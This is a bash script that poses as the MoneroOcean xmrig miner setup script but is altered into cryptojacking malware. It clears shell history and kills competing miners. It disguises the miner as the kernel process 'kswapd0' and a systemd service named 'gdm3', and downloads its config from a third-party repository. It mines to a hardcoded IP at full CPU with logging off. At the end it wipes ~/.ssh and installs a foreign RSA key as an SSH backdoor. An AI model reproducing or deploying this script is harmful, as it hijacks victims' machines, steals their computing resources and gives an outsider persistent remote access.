#!/bin/bash

unset HISTFILE
#unset HISTFILE ;history -d $((HISTCMD-1))
#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))

#systemctl disable gdm3 --now
#systemctl disable swapd --now

#chattr -i $HOME/.gdm3/
#chattr -i $HOME/.swapd/

#killall swapd
kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

#killall kswapd0
kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`

#rm -rf $HOME/.gdm3/
#rm -rf $HOME/.swapd/

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"


if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
	if   [ "$1" -gt "8192" ]; then
	  echo "8192"
	elif [ "$1" -gt "4096" ]; then
	  echo "4096"
	elif [ "$1" -gt "2048" ]; then
	  echo "2048"
	elif [ "$1" -gt "1024" ]; then
	  echo "1024"
	elif [ "$1" -gt "512" ]; then
	  echo "512"
	elif [ "$1" -gt "256" ]; then
	  echo "256"
	elif [ "$1" -gt "128" ]; then
	  echo "128"
	elif [ "$1" -gt "64" ]; then
	  echo "64"
	elif [ "$1" -gt "32" ]; then
	  echo "32"
	elif [ "$1" -gt "16" ]; then
	  echo "16"
	elif [ "$1" -gt "8" ]; then
	  echo "8"
	elif [ "$1" -gt "4" ]; then
	  echo "4"
	elif [ "$1" -gt "2" ]; then
	  echo "2"
	else
	  echo "1"
	fi
  else 
	echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.gdm3/gdm3.rc script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 1
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig
#killall -9 kswapd0

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
#rm -rf $HOME/.gdm3

echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
  exit 1
fi

# wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
# tar xf $HOME/.gdm3/xmrig.tar.gz

echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm3"
[ -d $HOME/.gdm3 ] || mkdir $HOME/.gdm3
if ! tar xf xmrig.tar.gz -C $HOME/.gdm3; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm3 directory"
  exit 1
fi
#rm xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.gdm3/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm3/config.json
$HOME/.gdm3/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.gdm3/xmrig ]; then
	echo "WARNING: Advanced version of $HOME/.gdm3/xmrig is not functional"
  else 
	echo "WARNING: Advanced version of $HOME/.gdm3/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
	echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
	exit 1
  fi

  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm3"
  if ! tar xf xmrig.tar.gz -C $HOME/.gdm3 --strip=1; then
	echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm3 directory"
  fi
  #rm xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/.gdm3/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm3/config.json
  $HOME/.gdm3/xmrig --help >/dev/null
  if (test $? -ne 0); then 
	if [ -f $HOME/.gdm3/xmrig ]; then
	  echo "ERROR: Stock version of $HOME/.gdm3/xmrig is not functional too"
	else 
	  echo "ERROR: Stock version of $HOME/.gdm3/xmrig was removed by antivirus too"
	fi
#    exit 1
  fi
fi

echo "[*] Miner $HOME/.gdm3/xmrig is OK"

mv $HOME/.gdm3/xmrig $HOME/.gdm3/kswapd0

#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
#if [ "$PASS" == "localhost" ]; then
#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
#fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi


rm -rf $HOME/.gdm3/config.json
#wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output /tmp/ctemp
mv /tmp/ctemp $HOME/.gdm3/config.json


sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm3/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm3/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm3/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm3/config.json
sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm3/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm3/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm3/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm3/config.json


cp $HOME/.gdm3/config.json $HOME/.gdm3/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm3/config_background.json


# preparing script

killall xmrig

echo "[*] Creating $HOME/.gdm3/gdm3.rc script"
cat >$HOME/.gdm3/miner.sh <<EOL
#!/bin/bash
if ! pidof kswapd0 >/dev/null; then
  nice $HOME/.gdm3/kswapd0 \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.gdm3/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .gdm3/gdm3.rc $HOME/.profile >/dev/null; then
	echo "[*] Adding $HOME/.gdm3/gdm3.rc script to $HOME/.profile"
	echo "$HOME/.gdm3/gdm3.rc --config=$HOME/.gdm3/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
	echo "Looks like $HOME/.gdm3/gdm3.rc script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.gdm3/xmrig.log file)"
  /bin/bash $HOME/.gdm3/gdm3.rc --config=$HOME/.gdm3/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
	echo "[*] Enabling huge pages"
	echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
	sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

	echo "[*] Running miner in the background (see logs in $HOME/.gdm3/kswapd0.log file)"
	/bin/bash $HOME/.gdm3/gdm3.rc --config=$HOME/.gdm3/config_background.json >/dev/null 2>&1
	echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
	echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

	echo "[*] Creating moneroocean systemd service"
	cat >gdm3.service <<EOL
[Unit]
Description=gdm3
[Service]
ExecStart=$HOME/.gdm3/kswapd0 --config=$HOME/.gdm3/config.json
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
	sudo mv gdm3.service /etc/systemd/system/gdm3.service
	echo "[*] Starting gdm3 systemd service"
	sudo killall kswapd0 2>/dev/null
	sudo systemctl daemon-reload
	sudo systemctl enable gdm3.service
	sudo systemctl start gdm3.service
	echo "To see miner service logs run \"sudo journalctl -u gdm3 -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
	echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
	echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm3/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm3/config_background.json"
fi
echo ""

rm -rf xmrig.tar*


echo "[*] Generating ssh key on server"

rm -rf ~/.ssh/authorized_keys
rm -rf ~/.ssh/
mkdir ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

echo "[*] Setup complete"